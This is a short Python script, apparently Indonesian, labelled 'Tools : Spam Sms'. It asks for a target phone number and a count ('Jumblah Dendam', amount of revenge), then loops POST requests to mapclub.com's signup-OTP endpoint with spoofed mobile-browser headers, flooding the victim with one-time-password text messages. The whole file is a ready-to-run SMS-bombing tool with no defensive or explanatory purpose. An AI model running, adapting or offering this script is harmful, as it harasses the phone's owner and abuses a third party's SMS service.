#Bebas recode :v
import os, requests, json
from requests import post
print ("Code : Safar/Cupu\nFriends : Isi Sendiri\nTools : Spam Sms")
print('=' *30)
no = input("NoPe|Ex8228823****: ")
mak = int(input("Jumblah Dendam: "))
hed = {
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
res = json.dumps({"phone":no})
for x in range(mak):
	s = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=res, headers=hed)
	print(s)
	